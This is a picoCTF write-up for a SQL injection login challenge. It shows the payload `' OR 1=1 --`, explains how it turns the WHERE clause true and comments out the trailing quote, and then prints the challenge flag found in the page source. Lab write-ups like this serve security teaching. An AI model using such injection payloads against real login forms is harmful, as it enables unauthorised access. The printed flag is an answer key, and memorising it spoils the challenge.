Description
Can you login to this website?

## Solution
Upon visiting the website, we get this login page. Based on the challenge
description, we know we have to bypass it with SQL injection, and based on the hint
we know we need to log in as `admin`. Let's now see what happens when we try a failed
login.

So it tells us the SQL query being made. Lets now use the payload `' OR 1=1 --`.
Explanation:
- `'` to escape the single quote
- `OR 1=1`: 1=1 evaluates to true, and true OR'ed with anythin will evaluate to true

Therefore, the statement `WHERE name='admin' AND password='' OR 1=1` will allow us to log
in as `admin`. However, there is still the extra single quote at the end, which will mess up
our query if we don't take it out. This is where the `--` comes in:
- `--`: comments out the rest of the line

Now, our payload will work. Let's submit it.
```
username: admin
password: ' OR 1=1 --
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1 --'
Logged in! But can you see the flag, it is in plainsight.
```
It worked! The only step we have to take now is to view the page source.
```
<pre>username: admin
password: &#039; OR 1=1 --
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR 1=1 --&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}</p>
```

**Flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}**
